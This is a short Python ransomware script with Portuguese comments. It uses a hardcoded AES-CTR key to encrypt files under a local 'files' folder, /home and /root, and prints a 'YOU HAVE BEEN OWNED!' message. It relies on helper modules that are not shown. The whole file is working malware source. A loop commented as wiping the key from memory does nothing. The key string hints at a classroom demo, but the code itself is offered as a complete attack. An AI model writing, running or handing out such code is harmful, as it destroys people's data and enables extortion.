#!/usr/bin/python3
# -*- coding: utf-8 -*-

from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import os
import Discovery
import Crypter

# Chave de descriptografia
HARDCODED_KEY = 'do not try this at home!'

# Recebe os argumentos no terminal
def get_parser():
    parser = argparse.ArgumentParser(description="OWNED")
    parser.add_argument('-d', '--decrypt', help='Decripta os arquivos [Default = NO]', action='store_true')
    return parser

def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        print('''
        YOU HAVE BEEN OWNED!
        -----------------------------
        PARA DECRIPTAR SEUS ARQUIVOS, DIGITE A SENHA:{}        
        '''.format(HARDCODED_KEY))

        key = input("Digite a senha: ")

    else:
        if HARDCODED_KEY:
            key = HARDCODED_KEY

    # Encriptação

    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

    if not decrypt:
        cryptoFn = crypt.encrypt

    else:
        cryptoFn = crypt.decrypt

    init_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))
    startDirs = [init_path, '/home', '/root']

    for currentDir in startDirs:
        for filename in Discovery.discover(currentDir):
            Crypter.change_files(filename, cryptoFn)


    # Limpando a chave criptográfica da memória
    for _ in range(100):
        pass

    if not decrypt:
        print('You have been OWNED!')
        pass


if __name__ == '__main__':
    main()